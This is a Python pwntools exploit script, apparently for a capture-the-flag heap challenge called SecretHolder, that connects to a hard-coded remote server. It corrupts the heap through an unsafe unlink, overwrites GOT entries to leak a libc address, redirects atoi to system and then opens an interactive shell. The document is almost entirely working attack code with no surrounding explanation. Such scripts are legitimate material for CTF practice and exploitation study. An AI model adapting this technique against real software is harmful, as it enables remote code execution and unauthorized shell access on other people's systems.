from pwn import *
from time import sleep

context.terminal = ['tmux', 'splitw', '-h']

small_secret = 0x6020B0
big_secret = 0x6020A0
puts_plt = 0x4006C0
free_got = 0x602018
read_got = 0x602040
atoi_got = 0x602070

read_base = 0xf69a0
system_base = 0x45380

size_num = { 'small': '1', 'big': '2', 'huge': '3' }

def keep(size):
    print r.recvuntil('3. Renew secret\n')
    log.info('keep ' + size + ' secret')
    r.sendline('1')
    print r.recvuntil('3. Huge secret\n')
    r.sendline(size_num[size])
    print r.recvuntil(':')
    r.send(size)

def wipe(size):
    print r.recvuntil('3. Renew secret\n')
    log.info('wipe ' + size + ' secret')
    r.sendline('2')
    print r.recvuntil('3. Huge secret\n')
    r.sendline(size_num[size])

def renew(size, content):
    print r.recvuntil('3. Renew secret\n')
    log.info('renew ' + size + ' secret')
    r.sendline('3')
    print r.recvuntil('3. Huge secret\n')
    r.sendline(size_num[size])
    print r.recvuntil(':')
    r.send(content)

# r = process('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8', env={'LD_PRELOAD': './libc.so.6_375198810bb39e6593a968fcbcf6556789026743'})
# gdb.attach(r, '''
# c
# ''')
r = remote('52.68.31.117', 5566)

keep('small')
wipe('small')
keep('big')
wipe('small')
keep('small')
keep('huge')
wipe('huge')
keep('huge')

renew('big', p64(0) + p64(49) + p64(small_secret-0x18) + p64(small_secret-0x10) + p64(32) + p64(400016))
wipe('huge') # trigger unsafe unlink
renew('small', 'A'*8 + p64(free_got) + 'A'*8 + p64(big_secret)) # padding + big_secret + huge_secret + small_secret
renew('big', p64(puts_plt))
renew('small', p64(read_got)) # *free_got = puts_plt, *big_secret = read_got

wipe('big') # puts(read_got)
data = r.recvline()
print repr(data)
read_addr = u64(data[:6] + '\x00\x00')
log.critical('read_addr: ' + hex(read_addr))
libc_addr = read_addr - read_base
log.critical('libc_addr: ' + hex(libc_addr))
system_addr = libc_addr + system_base
log.critical('system_addr: ' + hex(system_addr))

renew('small', p64(atoi_got) + 'A'*8 + p64(big_secret) + p64(1)) # big_secret + huge_secret + small_secret + big_in_use_flag
renew('big', p64(system_addr)) # *atoi_got = system_addr

log.critical("get shell")
r.send('sh')

r.interactive()
